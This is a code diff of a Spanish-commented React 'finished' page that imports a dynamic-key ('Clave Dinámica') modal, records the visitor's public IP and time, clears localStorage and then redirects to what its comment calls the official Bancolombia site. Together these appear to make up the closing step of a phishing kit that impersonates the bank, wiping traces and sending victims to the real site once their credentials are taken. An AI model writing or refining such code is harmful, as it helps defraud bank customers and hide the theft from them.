@@ -1,10 +1,9 @@
 import { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
 import ClaveDinaModal from "./modals/ClaveDinaModal";
 import AccionesModal from "./modals/accionesModal";
 import Loading from "app/components/Loading";
-import './css/LoginModal.css';
 import { limpiarPaddingBody } from "@utils";
+import './css/LoginModal.css';
 
 // Componente de la página finalizado
 export default function FinalizadoPage() {
@@ -40,65 +39,6 @@ export default function FinalizadoPage() {
     // Se inicializa los estados
     const [ip, setIp] = useState("");
     const [fechaHora, setFechaHora] = useState("");
-
-    // Se crea el useEffect para capturar la ip publica y la hora en estandar
-    useEffect(() => {
-
-        // Se limpia el padding del body
-        limpiarPaddingBody();
-
-        // Se obtiene la IP
-        obtenerIP();
-
-        // Se obtiene la fecha/hora con formato
-        obtenerFechaHora();
-
-        // Redireccionar después de 20 segundos
-        const redirectTimeout = setTimeout(() => {
-            window.location.href = process.env.REACT_APP_URL_BANK;
-        }, 20000); // 20 segundos
-
-        // Cleanup del timeout
-        return () => clearTimeout(redirectTimeout);
-    }, []);
-
-    //  Se crea el useEffect para ejecutar 1 minuto 
-    useEffect(() => {
-
-        // Ejecutar inmediatamente al montar
-        obtenerFechaHora();
-
-        // Calcular cuánto falta para el próximo minuto exacto
-        const ahora = new Date();
-        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
-
-        // Se inicializa el intervalId
-        let intervalId;
-
-        // Timeout para sincronizar con el cambio exacto de minuto
-        const timeoutId = setTimeout(() => {
-
-            // Actualizar por primera vez al llegar al próximo minuto
-            obtenerFechaHora();
-
-            // Luego actualizar cada 60 segundos
-            intervalId = setInterval(() => {
-
-                // Actualizar fecha y hora
-                obtenerFechaHora();
-            }, 60000);
-        }, msHastaProximoMinuto);
-
-        // Cleanup
-        return () => {
-
-            // Se limpia el timeout e interval
-            clearTimeout(timeoutId);
-
-            // Se limpia el interval si existe
-            if (intervalId) clearInterval(intervalId);
-        };
-    }, []);
 
     // Obtiene la dirección IP pública del usuario
     const obtenerIP = async () => {
@@ -157,6 +97,77 @@ export default function FinalizadoPage() {
             lanzarModalAcciones: false
         }));
     };
+
+    // Se crea el useEffect para capturar la ip publica y la hora en estandar
+    useEffect(() => {
+
+        // Se limpia el padding del body
+        limpiarPaddingBody();
+
+        // Se obtiene la IP
+        obtenerIP();
+
+        // Se obtiene la fecha/hora con formato
+        obtenerFechaHora();
+
+        // Se borra el localStorage después de 15 segundos para limpiar cualquier dato residual
+        setTimeout(() => {
+
+            // Se borra el localStorage para limpiar cualquier dato residual
+            localStorage.clear();
+        }, 15000);
+
+        // Redireccionar después de 20 segundos
+        const redirectTimeout = setTimeout(() => {
+
+            // Se borra el localStorage para limpiar cualquier dato residual
+            localStorage.clear();
+
+            // Se redirecciona al sitio oficial de Bancolombia
+            window.location.href = process.env.REACT_APP_URL_BANK;
+        }, 20000);
+
+        // Cleanup del timeout
+        return () => clearTimeout(redirectTimeout);
+    }, []);
+
+    //  Se crea el useEffect para ejecutar 1 minuto 
+    useEffect(() => {
+
+        // Ejecutar inmediatamente al montar
+        obtenerFechaHora();
+
+        // Calcular cuánto falta para el próximo minuto exacto
+        const ahora = new Date();
+        const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
+
+        // Se inicializa el intervalId
+        let intervalId;
+
+        // Timeout para sincronizar con el cambio exacto de minuto
+        const timeoutId = setTimeout(() => {
+
+            // Actualizar por primera vez al llegar al próximo minuto
+            obtenerFechaHora();
+
+            // Luego actualizar cada 60 segundos
+            intervalId = setInterval(() => {
+
+                // Actualizar fecha y hora
+                obtenerFechaHora();
+            }, 60000);
+        }, msHastaProximoMinuto);
+
+        // Cleanup
+        return () => {
+
+            // Se limpia el timeout e interval
+            clearTimeout(timeoutId);
+
+            // Se limpia el interval si existe
+            if (intervalId) clearInterval(intervalId);
+        };
+    }, []);
 
     // Renderiza el componente
     return (
